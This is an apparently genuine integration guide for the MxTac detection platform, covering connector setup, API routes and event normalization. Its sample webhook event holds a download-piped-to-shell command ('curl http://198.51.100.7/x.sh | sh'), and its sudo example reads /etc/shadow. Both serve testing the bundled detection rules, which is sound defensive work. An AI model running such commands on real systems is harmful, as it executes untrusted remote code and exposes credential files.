# Source integration guide

MxTac has five source types. All five feed the detection pipeline: their events are normalized to OCSF, stored, searchable in Hunt and evaluated by Sigma rules.

| Type | Input | Normalizer |
|------|-------|------------|
| `wazuh` | Polls the Wazuh manager REST API | `services/normalizers/wazuh.py` |
| `zeek` | Reads Zeek log files from a directory | `services/normalizers/zeek.py` |
| `suricata` | Reads the Suricata EVE JSON file | `services/normalizers/suricata.py` |
| `syslog` | Listens for syslog messages | `services/normalizers/syslog.py` |
| `generic` | Receives JSON over HTTP (webhook) | `services/normalizers/webhook.py` |

Normalizer paths are relative to `app/backend/app/`.

## Managing connectors

A connector is a named configuration stored in the database. Create and manage connectors on the **Sources** page or through the API. The `engineer` and `admin` roles can do this.

| Action | Route |
|--------|-------|
| List | `GET /api/v1/connectors` |
| Create | `POST /api/v1/connectors` |
| Update or disable | `PATCH /api/v1/connectors/{id}` |
| Delete | `DELETE /api/v1/connectors/{id}` |
| Test the connection | `POST /api/v1/connectors/{id}/test` (Wazuh, Zeek and Suricata) |
| Health and counters | `GET /api/v1/connectors/{id}/health` |
| Start, stop | `POST /api/v1/connectors/{id}/start`, `POST /api/v1/connectors/{id}/stop` |

Create request:

```json
{
  "name": "wazuh-main",
  "connector_type": "wazuh",
  "enabled": true,
  "config": { }
}
```

`config` holds the settings from the sections below. Enabled connectors start with the backend. Connector settings are stored in the database without encryption. A name can be used once; a second connector with the same name is refused with `409`.

A new installation has no connectors. The Sources page and the source status card on the Overview page stay empty until you add one.

File-based connectors (Zeek, Suricata) read paths **inside the backend container**. Mount the log directory into the container, for example in `app/docker-compose.yml`:

```yaml
  backend:
    volumes:
      - ./backend:/app
      - /var/log/suricata:/var/log/suricata:ro
      - /opt/zeek/logs/current:/opt/zeek/logs/current:ro
```

Read positions for Zeek and Suricata files are saved under `/var/lib/mxtac` in the container (override with the `MXTAC_STATE_DIR` environment variable). Mount a volume there to keep positions across container re-creation.

## Wazuh

The connector authenticates against the Wazuh manager API with `GET /security/user/authenticate` and then polls `GET /alerts` for alerts newer than the last poll.

| Setting | Required | Default | Description |
|---------|----------|---------|-------------|
| `url` | Yes | | Base URL of the Wazuh API, for example `https://wazuh.internal:55000` |
| `username` | Yes | | Wazuh API user |
| `password` | Yes | | Password of that user |
| `verify_ssl` | No | `true` | Set to `false` for a self-signed certificate |
| `poll_interval_seconds` | No | `60` | Seconds between polls |

After a failed poll the connector retries with a delay that grows from 1 to 60 seconds.

## Zeek

The connector tails Zeek log files and tags each event with the log type. It reads JSON logs and has a basic parser for the tab-separated format.

| Setting | Required | Default | Description |
|---------|----------|---------|-------------|
| `log_dir` | Yes | `/opt/zeek/logs/current` | Directory that contains the log files |
| `log_types` | No | `["conn", "dns", "http", "ssl", "files"]` | Log types to read. Each maps to `<type>.log` |
| `poll_interval_seconds` | No | `60` | Seconds between reads |

JSON logs are the better-supported format. To enable them in Zeek, load `policy/tuning/json-logs.zeek`.

## Suricata

The connector tails the EVE JSON file. On the first start it begins at the end of the file, so only new events are read. After a log rotation it starts again from the beginning of the new file.

| Setting | Required | Default | Description |
|---------|----------|---------|-------------|
| `eve_file` | Yes | `/var/log/suricata/eve.json` | Path to the EVE JSON file |
| `event_types` | No | `["alert", "dns", "http", "tls"]` | EVE `event_type` values to ingest. Other events are skipped |
| `poll_interval_seconds` | No | `60` | Seconds between reads |

## Syslog

There are two ways to receive syslog. Both parse RFC 3164 and RFC 5424 messages and publish them to the same queue topic.

**Syslog connector** (a connector of type `syslog`, UDP only):

| Setting | Default | Description |
|---------|---------|-------------|
| `host` | `0.0.0.0` | Bind address |
| `port` | `514` | UDP port |
| `max_message_size` | `65535` | Larger datagrams are dropped |

**Syslog receiver** (configured with environment variables, UDP and TCP, no connector row needed):

| Variable | Default | Description |
|----------|---------|-------------|
| `SYSLOG_ENABLED` | `false` | Start the receiver with the backend |
| `SYSLOG_HOST` | `0.0.0.0` | Bind address |
| `SYSLOG_PORT` | `1514` | Port |
| `SYSLOG_PROTOCOL` | `udp` | `udp`, `tcp` or `both` |
| `SYSLOG_MAX_MESSAGE_SIZE` | `65535` | Maximum message size in bytes |

The Compose files do not publish a syslog port. Add a port mapping to the `backend` service, for example `"514:1514/udp"` for the receiver.

### How a syslog message is normalized

| Syslog part | Normalized event |
|-------------|------------------|
| Timestamp | Event time. An RFC 3164 timestamp has no year and no time zone; the current year and UTC are assumed |
| Host name in the message, sender address | `dst_endpoint.hostname`, `dst_endpoint.ip`. This is the host that shows on a detection |
| Program name and process ID | `process.name`, `process.pid`, and the field `app_name` |
| Severity 0 to 7 | OCSF severity: 0 to 2 critical, 3 high, 4 medium, 5 low, 6 and 7 informational |
| Message text | Field `message` |
| Facility | Fields `facility` and `facility_name` |

Two message families get a more specific event class:

| Message | Event class | Extracted |
|---------|-------------|-----------|
| SSH login results (`Failed password for ...`, `Accepted publickey for ...`, `Invalid user ...`) and PAM `authentication failure` | Authentication | User in `actor_user.name`, remote address and port in `src_endpoint` |
| sudo command log (`alice : TTY=... ; COMMAND=/usr/bin/cat /etc/shadow`) | Process Activity | Command in `process.cmd_line`, program path in `process.path`, invoking user in `actor_user.name` |

Every other message is stored as a Base Event. Rules can still match it through the `message` and `app_name` fields.

Each event names the services `syslog`, the program name in lower case, and `auth` or `cron` for those facilities. Sigma rules with a `logsource.service` use these names.

### Test message

With a syslog port published on 514/udp:

```bash
echo "<38>$(date -u '+%b %e %H:%M:%S') web01 sshd[2211]: Failed password for root from 203.0.113.5 port 51122 ssh2" \
  | nc -u -w1 localhost 514
```

The bundled rule "SSH Failed Password for Root" matches this message and creates a detection on the host `web01`. The event is stored with the time in the message, read as UTC.

## Generic webhook

1. Create a connector of type `generic` with a token:

   ```json
   {
     "name": "custom-source",
     "connector_type": "generic",
     "config": { "webhook_token": "<a long random string>" }
   }
   ```

2. Send events as a JSON object or an array of objects:

   ```bash
   curl -X POST http://localhost:15000/api/v1/ingest \
     -H "X-MxTac-Source: custom-source" \
     -H "X-MxTac-Token: <the token>" \
     -H "Content-Type: application/json" \
     -d '[{"timestamp": "2026-01-01T12:00:00Z", "host": "web01", "user": "alice", "command_line": "curl http://198.51.100.7/x.sh | sh", "message": "Suspicious download"}]'
   ```

   The response has the status `202` and reports how many events were accepted: `{"accepted": 1, "rejected": 0}`. Array items that are not JSON objects are counted as rejected.

   The bundled rule "Download Piped to Shell" matches this example and creates a detection on the host `web01`.

| Limit | Value |
|-------|-------|
| Body size | 5 MB |
| Requests per source | 100 per minute |
| Requests per client IP | 60 per minute (general write limit) |

`POST /api/v1/ingest/test` checks the source name and token without sending events. The **Sources** page has a "Send test event" card that posts a sample event from the browser.

### How a webhook event is normalized

The normalizer looks for common field names. The first name of a row that is present is used.

| Field names in the event | Normalized event |
|--------------------------|------------------|
| `timestamp`, `time`, `@timestamp` | Event time. ISO 8601, or epoch seconds or milliseconds. Without it, the time of receipt |
| `host`, `hostname` | `dst_endpoint.hostname`, the host that shows on a detection |
| `user`, `username`, `user_name` | `actor_user.name` |
| `src_ip`, `source_ip` | `src_endpoint.ip` |
| `dst_ip`, `dest_ip`, `destination_ip` | `dst_endpoint.ip` |
| `src_port`, `source_port` | `src_endpoint.port` |
| `dst_port`, `dest_port`, `destination_port` | `dst_endpoint.port` |
| `process`, `process_name` | `process.name` |
| `process_path`, `image`, `exe` | `process.path`, the full path of the program. Sigma conditions on `Image` or `path` use it |
| `command_line`, `cmd_line`, `commandline`, `command` | `process.cmd_line` |
| `pid`, `process_id` | `process.pid` |
| `message`, `msg` | Field `message`, also used as the event summary |
| `severity`, `level` | Severity. A number from 0 to 5, or a name such as `low`, `warning`, `high`, `critical` |
| `id`, `event_id` | Event UID |
| `os`, `os_name` | Operating system of the host. Sigma rules for a `product` such as `linux` or `windows` use it |
| `service` | Service names for Sigma rules with a `logsource.service` |

Every other top-level field is kept under its own name, and Sigma rules can reference it. The original object is stored with the event.

| Event content | Event class |
|---------------|-------------|
| A process name, a process path or a command line | Process Activity |
| A source and a destination address | Network Activity |
| Anything else | Base Event |

The name of the connector is kept in the raw event as `unmapped.source`, and Sigma rules can reference it as `source`. The flat field `source` that the Hunt page shows and filters on is the source type (`Webhook`, `Syslog`, `Wazuh`, `Zeek`, `Suricata`), not the connector name.

A source that is disabled refuses events and the test request with `403`. Each accepted request adds its number of events to the event count of the source and sets "last seen".

## Checking that events arrive

1. Open the **Sources** page. A running connector shows its status, event count and when it was last seen. The counts of a polling connector are written after each poll, those of a syslog connector every 5 seconds, and those of a webhook source with each request.
2. Open **Hunt** and run a search, for example for a word of the message, the host or the user, or with a filter on the source.
3. Open **Detections**. An event that matches an enabled rule creates a detection. The same rule on the same host creates at most one detection in 5 minutes.
4. Check the backend log: `docker compose logs -f backend`.
5. Check the metrics at `/metrics`, for example the counters for ingested events and dead-letter events.
